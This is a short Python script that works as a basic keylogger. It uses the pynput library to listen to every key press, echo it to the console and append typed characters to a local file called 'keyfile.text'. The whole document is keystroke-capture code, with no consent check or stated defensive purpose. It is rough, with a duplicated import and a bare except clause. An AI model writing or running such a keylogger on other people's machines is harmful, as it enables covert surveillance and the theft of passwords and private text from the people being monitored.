from pynput import keyboard

# Function to handle key presses
from pynput import keyboard 

def keyPressed(key):
    print(str(key))
    with open("keyfile.text", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting")

if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()